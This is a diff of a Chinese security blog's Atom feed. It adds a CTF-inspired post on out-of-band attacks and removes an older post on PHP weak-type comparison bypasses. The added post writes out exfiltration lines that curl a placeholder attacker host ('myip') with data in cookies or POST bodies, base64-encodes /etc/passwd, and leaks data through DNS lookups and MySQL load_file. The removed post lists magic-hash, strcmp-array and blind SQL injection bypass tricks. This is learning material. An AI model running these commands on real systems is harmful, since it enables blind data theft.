@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://someonesometimes.github.io/"/>
-  <updated>2017-10-24T11:08:38.123Z</updated>
+  <updated>2017-11-14T15:58:23.665Z</updated>
   <id>https://someonesometimes.github.io/</id>
   
   <author>
@@ -15,6 +15,24 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Out Of Band 带外攻击的一点总结</title>
+    <link href="https://someonesometimes.github.io/2017/11/14/Out-Of-Band-%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/"/>
+    <id>https://someonesometimes.github.io/2017/11/14/Out-Of-Band-带外攻击的一点总结/</id>
+    <published>2017-11-14T14:51:05.000Z</published>
+    <updated>2017-11-14T15:58:23.665Z</updated>
+    
+    <content type="html"><![CDATA[<p>在上周的HCTF中的boring website题目中才第一次接触到了sql中的带外攻击，在网上收集资料整理了一些，再加上之前零碎的一些记录，想想还是记录一下目前自己对带外攻击的理解与应用范畴吧，当然并不只限于sql中的应用</p><a id="more"></a><h2 id="什么是带外攻击，应用场景有哪些？"><a href="#什么是带外攻击，应用场景有哪些？" class="headerlink" title="什么是带外攻击，应用场景有哪些？"></a>什么是带外攻击，应用场景有哪些？</h2><p>在很多攻击中，可能我们无法直接看到攻击的回显，也许攻击行为的确产生了，但数据并不一定能够回显到攻击者的眼中，这时候我们可以借助网络请求，将回显结果发送到我们的服务器上，就可以看到回显了，这种方式就叫做带外攻击</p><p>比较常见的使用场景有这些，如果我们无法直接看到攻击的回显，就可以考虑使用带外攻击来通过网络请求拿到回显数据</p><ul><li>命令执行</li><li>sql注入</li><li>XXE</li></ul><h2 id="介绍几个常用的接收回显的网站"><a href="#介绍几个常用的接收回显的网站" class="headerlink" title="介绍几个常用的接收回显的网站"></a>介绍几个常用的接收回显的网站</h2><ul><li><p>火日师傅在github上开源的<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="external">xss平台</a></p><p>好处是搭在自己的vps上面，修改使用起来都十分方便，而且记录的参数十分详细，cookie，post，get的数据都能拿到，问题是没法获得基于dns方式的数据，而且链接限制在了<a href="http://ip/xss/这样，url形式不能修改，只能改变传输的参数" target="_blank" rel="external">http://ip/xss/这样，url形式不能修改，只能改变传输的参数</a></p></li><li><p><a href="http://ceye.io" target="_blank" rel="external">ceye平台</a></p><p>应该是知道创宇的平台，为每个用户分配一个识别url，方便的地方是除了支持http链接接收，还可以通过dns方式接收回显，并且链接的形式比较随意，域名啊，后面的路径啊都随意，只要域名是基于为自己分配的指定url就可以。不太方便的地方就是貌似对http方式发送回显的接收结果中是看不到太详细的数据的。</p></li></ul><h2 id="带外攻击中两种回显信息发送方式"><a href="#带外攻击中两种回显信息发送方式" class="headerlink" title="带外攻击中两种回显信息发送方式"></a>带外攻击中两种回显信息发送方式</h2><h3 id="很常见的通过http方式发送，回显信息可以放在以下几个位置："><a href="#很常见的通过http方式发送，回显信息可以放在以下几个位置：" class="headerlink" title="很常见的通过http方式发送，回显信息可以放在以下几个位置："></a>很常见的通过http方式发送，回显信息可以放在以下几个位置：</h3><ul><li><a href="http://myip/id=xxxxx" target="_blank" rel="external">http://myip/id=xxxxx</a> get参数部分</li><li>curl –cookie id=xxxx <a href="http://myip" target="_blank" rel="external">http://myip</a>   放在cookie里</li><li>curl –data id=xxxx <a href="http://myip" target="_blank" rel="external">http://myip</a>    放在post参数</li><li><a href="http://myip/xxxx" target="_blank" rel="external">http://myip/xxxx</a> 放在路径里</li></ul><p>有一点要提醒的是，测试中看到，发送数据有换行的话，或多或少的都会有问题，因为建议将数据进行编码后再传输，比如在命令注入中可以使用<code>cat /etc/passwd | base64</code>来将回显结果进行编码</p><h3 id="通过DNS解析方式来获得回显"><a href="#通过DNS解析方式来获得回显" class="headerlink" title="通过DNS解析方式来获得回显"></a>通过DNS解析方式来获得回显</h3><p>这也是在HCTF中才知道的姿势（哎，感觉自己孤陋寡闻，真的好菜。。。）。大致原理是这样的，还是发送一个链接，我们将回显信息放到域名里去，大致就是<a href="http://xxxx.myip/这种形式，服务器对于这种链接会首先进行DNS解析来拿到对应域名的IP才能发送IP报文，而这种DNS报我们是可以拿到的，就是通过上面介绍到的ceye平台，可以查询DNS报，也就是某个域名的解析记录，这样我们就可以拿到了回显的数据" target="_blank" rel="external">http://xxxx.myip/这种形式，服务器对于这种链接会首先进行DNS解析来拿到对应域名的IP才能发送IP报文，而这种DNS报我们是可以拿到的，就是通过上面介绍到的ceye平台，可以查询DNS报，也就是某个域名的解析记录，这样我们就可以拿到了回显的数据</a></p><p>讲道理这种方式很明显没有直接通过http发送数据来的方便，但的确在某些时候只能用这种方式来对外发送请求将数据传输出来，通过对HCTF中那道sql题目的测试，可以发现loadfile(‘\\\\vips\x\‘?id=123)在平台上是接收不到请求的，从sql执行结果上看执行时间是0s，看来没有发送网络请求，只有我们换一个域名，在不同域名的时候，sql执行结果才会显示花费了一定的时间，看来是用来进行DNS查询了，在这种sql的带外攻击中，loadfile函数只能配合DNS方式的回显才能做到</p><h2 id="一些payload"><a href="#一些payload" class="headerlink" title="一些payload"></a>一些payload</h2><p>可以直接参见ceye的网站，里面有各种攻击场景下的payload，还是很全的</p><p><a href="http://ceye.io/payloads" target="_blank" rel="external">http://ceye.io/payloads</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在上周的HCTF中的boring website题目中才第一次接触到了sql中的带外攻击，在网上收集资料整理了一些，再加上之前零碎的一些记录，想想还是记录一下目前自己对带外攻击的理解与应用范畴吧，当然并不只限于sql中的应用&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>Java阻塞队列学习及LinkedBlockingQueue源码分析</title>
@@ -419,29 +437,6 @@
     <summary type="html">
     
       &lt;p&gt;断断续续的，为时一年的密码学也终于在今天的结课考试中告一段落，之所以在这里写下这些零碎的想法，是因为总感觉这是一个很关键的转折点。之前一年的学习主要是对密码学所涉及的数学知识以及现行加密体系的掌握，学习了部分数论，加密算法流程等。&lt;br&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>PHP中弱类型的转化漏洞</title>
-    <link href="https://someonesometimes.github.io/2017/04/19/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E8%BD%AC%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
-    <id>https://someonesometimes.github.io/2017/04/19/PHP弱类型转化的漏洞/</id>
-    <published>2017-04-19T15:15:47.000Z</published>
-    <updated>2017-07-16T02:41:10.637Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="官方文档中的几句话已经说的很清楚了"><a href="#官方文档中的几句话已经说的很清楚了" class="headerlink" title="官方文档中的几句话已经说的很清楚了"></a>官方文档中的几句话已经说的很清楚了</h2><blockquote><p><strong>==是弱类型漏洞的罪恶根源</strong><br><strong>在==中，<em>数值和字符串比较</em>，则字符串会被转换为数值并且比较按照数值来进行。<em>两个可以完美转化为数值型的字符串</em>（0e123,0x123 但0e4fe，12f3不可），将转化为数值比较</strong></p><hr><p><strong>当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对，基本不会出现弱类型比较的漏洞</strong></p><hr><p><strong>对了，这些规则经过测试，在mysql的比较中是一样的</strong><br><a id="more"></a></p></blockquote><p><br></p><h2 id="从几个例子中学习字符型是如何转换为数值的："><a href="#从几个例子中学习字符型是如何转换为数值的：" class="headerlink" title="从几个例子中学习字符型是如何转换为数值的："></a>从几个例子中学习字符型是如何转换为数值的：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">其中0代表转化失败，转化成功即为对应的数值</div><div class="line">&apos;xie&apos;=&gt;0</div><div class="line">&apos;0xff&apos;=&gt;0xff</div><div class="line">&apos;0xfz&apos;=&gt;0xf</div><div class="line">&apos;0xzf&apos;=&gt;0  这个比较有趣，0是转化成功的结果，而不是转化失败的意思</div><div class="line">&apos;x1&apos;=&gt;0</div><div class="line">&apos;1x&apos;=&gt;1</div><div class="line">&apos;0e123456&apos;=&gt;0 很神奇，0e123这种数值代表幂写法，已经好几次碰到了</div></pre></td></tr></table></figure><p><br></p><h2 id="php弱类型漏洞的应用场景"><a href="#php弱类型漏洞的应用场景" class="headerlink" title="php弱类型漏洞的应用场景"></a>php弱类型漏洞的应用场景</h2><ul><li>对不同类型的比较,在使用==时，php会进行转化后再比较</li><li><p>判断中即使两端都是字符型的，但一些情况下仍然做出数值型的比较，将因数值型的比较特性导致某些判断被绕过，测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">数值型的比较特性：</div><div class="line">0e0 == 0       基于科学计数法的转换</div><div class="line">0x80 == 128    基于进制转换</div><div class="line"></div><div class="line">那么如下比较将成立</div><div class="line">&apos;0e0&apos; == &apos;0&apos;</div><div class="line">&apos;0x80&apos; == &apos;128&apos;</div></pre></td></tr></table></figure></li><li><p>一些其他的比较场景</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0 == NULL</div><div class="line">flag&#123;xxx&#125;=&apos;&apos;=&apos;&apos;</div></pre></td></tr></table></figure></li><li><p>类型的运算的结果都是数值型的，如果参数有字符型的话，就按照上述的转换方式来转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&apos;flagpig&apos;+1 = 1</div><div class="line">&apos;11zip&apos;+1=12</div><div class="line">&apos;0&apos;+&apos;1&apos;+&apos;0&apos;=1</div><div class="line">&apos;xie&apos;+&apos;fei&apos;=0</div></pre></td></tr></table></figure></li></ul><p><br></p><h2 id="记录比赛中关于判断的一些例子"><a href="#记录比赛中关于判断的一些例子" class="headerlink" title="记录比赛中关于判断的一些例子"></a>记录比赛中关于判断的一些例子</h2><ul><li>md5(password)==md5(username)<br>基于转后后是十六进制数值，利用两个数值的幂写法进行了绕过。。。</li><li>使用<code>strcmp</code>进行比较的判断中，文档中给出：<code>int strcmp ( string $str1 , string $str2 )</code>，如果一个参数是数组，将产生NULL结果，若对结果进行strcmp()==0判断，将通过</li><li>使用一个很有意思的逻辑：<code>任意字符串+0 = 任意字符串</code>,这样就可以把字符串转化为0而通过所有与字符串比较的弱类型判断</li><li>数据库的题目，可以使用where “xie”=”meng”=”fei”来实现判断或者经常使用的passwd=’’=’’</li><li>两个数值的相等判断，可以使用幂的表示方法：<code>0e123==0e456</code></li><li>返回结果==false时，因为0==false，除0外的所有数字==true，这样可能实现绕过。但如果是使用返回结果===false时，就没法伪造返回结果为数字，因为此时要求比较的类型也是相同的，只有真正的返回结果可以做到</li><li><strong>利用’0’+’1’的结果是数值型,这种利用可以用在mysql注入中，这样可以把预定的sex=’xx’转化为sex=数值型对象，接下来就是判断中类型转化的原理了</strong><br>应用：sex=’0’+’1’+’0’ 第一个0用于闭合句式中的前引号，最后一个0用于闭合句式中的后引号，中间的将用于盲注，是0是1将影响输出结果  本题将有两个结果：sex=0 or sex=1 产生两种不同情况以作为盲注判断条件</li><li>使用这样一种判断：<code>$req[&#39;number&#39;]==strval(intval($req[&#39;number&#39;]))</code>,之前一直担心先intval再strval会把进制与科学记数法的姿势限制住，测试后才意识到两边都是字符型的数值下，会进行转换的，因此req[‘number’]=0e00是没有问题的，可以通过比较</li><li>一般弱类型语言都会有浮点数精度问题，像python，php都存在的。<br>所以if(“0.999999999999999999999999” == 1)是成立的，<br>同理if(“1.00000000000000000000001” == 1)也是成立的</li><li>1e-324 == 0成立    (int)1e-324 &gt; 0成立    利用的应该也是精度问题</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;官方文档中的几句话已经说的很清楚了&quot;&gt;&lt;a href=&quot;#官方文档中的几句话已经说的很清楚了&quot; class=&quot;headerlink&quot; title=&quot;官方文档中的几句话已经说的很清楚了&quot;&gt;&lt;/a&gt;官方文档中的几句话已经说的很清楚了&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;==是弱类型漏洞的罪恶根源&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;在==中，&lt;em&gt;数值和字符串比较&lt;/em&gt;，则字符串会被转换为数值并且比较按照数值来进行。&lt;em&gt;两个可以完美转化为数值型的字符串&lt;/em&gt;（0e123,0x123 但0e4fe，12f3不可），将转化为数值比较&lt;/strong&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对，基本不会出现弱类型比较的漏洞&lt;/strong&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;对了，这些规则经过测试，在mysql的比较中是一样的&lt;/strong&gt;&lt;br&gt;
     
     </summary>
     
